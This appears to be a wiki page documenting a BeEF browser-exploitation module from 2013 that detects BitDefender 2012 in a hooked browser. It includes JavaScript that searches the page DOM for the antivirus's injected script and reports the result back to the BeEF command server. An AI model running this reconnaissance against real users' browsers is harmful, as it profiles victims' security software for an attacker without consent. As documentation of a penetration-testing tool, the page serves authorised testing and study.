##Summary

* **Objective**: Detect Bit Defender 2012 on the system
* **Date**: June 2013
* **Authors**: Nbblrr
* **Browsers**: All
* Code

##Internal Working

Bit Defender 2012 includes a javascript script in each browser to display this bar :
[[Images/module_bitdefender2012_bar.png|align=center]]

So it is easy to look for the script in the DOM :

```javascript
    var temp=document.body.innerHTML;
    var key="netdefender/hui/ndhui.js";
    if(temp.indexOf(key)>0) {
        beef.net.send('<%= @command_url %>', <%= @command_id %>,'bitdefender=Installed');
    } else {
        beef.net.send('<%= @command_url %>', <%= @command_id %>,'bitdefender=Not Installed');
    };
```


## Screenshots

[[Images/module_bitdefender2012_bar.png|align=center]]

[[Images/module-detect-bitdefender2012.png|align=center]]

##Feedback

